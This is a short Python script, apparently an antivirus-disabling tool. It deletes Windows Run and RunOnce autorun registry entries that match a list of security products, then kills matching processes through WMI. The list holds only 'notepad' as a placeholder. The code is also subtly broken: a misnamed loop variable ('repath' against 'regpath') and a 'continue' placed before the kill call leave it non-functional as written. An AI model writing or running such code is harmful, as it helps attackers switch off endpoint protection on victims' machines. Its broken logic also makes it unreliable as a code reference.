import winreg, wmi, os, signal

#the list of Antivirus software we are going to be searching for in this case just notepad
av_list = ["notepad"]

# remove Registry Keys
reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
regpaths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
for reghive in reghives:
    for repath in regpaths:
        reg = winreg.ConnectRegistry(None, reghive)
        key = winreg.OpenKey(reg, regpath, 0, access = winreg.KEY_READ)
        try:
            index = 0
            while True:
                val = winreg.EnumValue(key, index)
                for name in av_list:
                    if name in val[1]:
                        print(f"Deleteing Autorun key {val[0]}")
                        key2 = winreg.OpenKey(reg, regpath, 0, access = winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2, val[0])
                index += 1
        except OSError:
            ()

# Find and kill Processes
f = wmi.WMI()
for process in f.Win32_Process():
    for name in av_list:
        if name in process.Name:
            continue
            os.kill(int(process.processId), signal.SIGTERM)
